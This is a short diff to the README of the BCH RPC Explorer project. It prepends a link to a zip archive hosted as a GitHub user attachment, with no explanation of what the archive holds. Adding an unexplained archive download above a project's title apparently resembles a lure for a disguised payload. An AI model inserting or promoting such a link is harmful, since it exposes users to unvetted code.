@@ -1,3 +1,4 @@
+[bch-rpc-explorer-add-cross-check-to-transaction.zip](https://github.com/user-attachments/files/16534815/bch-rpc-explorer-add-cross-check-to-transaction.zip)
 # BCH RPC Explorer
 
 [![npm version][npm-ver-img]][npm-ver-url] [![NPM downloads][npm-dl-img]][npm-dl-url]
